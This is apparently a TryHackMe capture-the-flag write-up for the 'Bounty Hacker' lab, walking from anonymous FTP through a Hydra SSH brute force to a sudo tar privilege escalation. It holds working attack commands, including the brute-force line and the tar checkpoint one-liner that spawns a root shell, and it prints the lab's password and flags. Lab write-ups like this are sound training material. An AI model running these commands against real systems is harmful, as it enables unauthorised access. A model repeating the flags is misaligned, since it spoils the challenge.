# TryHackMe — Bounty Hacker

Easy-difficulty box. FTP anon → credential harvest → SSH → sudo/tar GTFOBins → root.

**Target:** `10.48.159.240`
**User flag:** `THM{CR1M3_SyNd1C4T3}`
**Root flag:** `THM{80UN7Y_h4cK3r}`
**Time to root:** < 15 min

---

## Recon

```bash
nmap -sSCV 10.48.159.240 -oX Bounty_hacker.xml
```

| Port | Service | Version |
|------|---------|---------|
| 21   | ftp     | vsftpd 3.0.5 — **anonymous login allowed** |
| 22   | ssh     | OpenSSH 8.2p1 (Ubuntu) |
| 80   | http    | Apache 2.4.41 (Ubuntu) |

<img width="940" height="529" alt="image" src="https://github.com/user-attachments/assets/cca5acc9-d99e-483b-a1ae-1d63cf5cc533" />

Checked port 80 (manual + dirbrute) — no hidden paths, nothing usable. Moved to FTP.

---

## FTP — Anonymous Login

```bash
ftp 10.48.159.240
# user: anonymous
```

```
-rw-rw-r--  1 ftp ftp  418 locks.txt
-rw-rw-r--  1 ftp ftp   68 task.txt
```

```bash
get task.txt
get locks.txt
```

<img width="940" height="251" alt="image" src="https://github.com/user-attachments/assets/ca4378ba-d655-4c03-88a1-027ea80e83b3" />

**task.txt**
```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```
→ username: `lin`

**locks.txt** → themed password wordlist (26 entries)

<img width="854" height="186" alt="image" src="https://github.com/user-attachments/assets/924df75f-2333-4928-9f16-7a44811e42d1" />
<img width="940" height="647" alt="image" src="https://github.com/user-attachments/assets/6d71a2f7-67d7-4226-ba0e-c41b773b9013" />

---

## Credential Access — Hydra

```bash
hydra -l lin -P locks.txt ssh://10.48.159.240
```

```
[22][ssh] host: 10.48.159.240   login: lin   password: RedDr4gonSynd1cat3
```

<img width="940" height="124" alt="image" src="https://github.com/user-attachments/assets/f62d6ea4-7441-42eb-9af6-0b22a2f9fb33" />

---

## Foothold

```bash
ssh lin@10.48.159.240
cd Desktop
cat user.txt
```
```
THM{CR1M3_SyNd1C4T3}
```

<img width="940" height="490" alt="image" src="https://github.com/user-attachments/assets/b57a3480-768d-4ea4-bed0-829dfe6b88d1" />

---

## Privilege Escalation

```bash
sudo -l
```
```
User lin may run the following commands on ip-10-48-159-240:
    (root) /bin/tar
```
<img width="1566" height="145" alt="image" src="https://github.com/user-attachments/assets/e42af98b-435d-4871-8af0-a2a67cda7d01" />


`tar` = known [GTFOBins](https://gtfobins.github.io/gtfobins/tar/) sudo escalation vector.

Before pulling the exact syntax from GTFOBins, checked shell history — the command was already there:

```bash
cat .bash_history
```

```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Ran it → root shell:

```bash
cd /root
cat root.txt
```
```
THM{80UN7Y_h4cK3r}
```

<img width="940" height="773" alt="image" src="https://github.com/user-attachments/assets/609f015c-f157-493b-82b1-1f46ccc21939" />

---

## Summary

| Stage | Technique |
|---|---|
| Recon | Nmap full scan |
| Access | Anonymous FTP → credential files |
| Auth bypass | Hydra SSH bruteforce w/ targeted wordlist |
| Privesc | sudo misconfig on `/bin/tar` (GTFOBins) |

**Note:** Escalation command was found pre-existing in `.bash_history` — checking local artifacts before external references (GTFOBins) saved a lookup step.
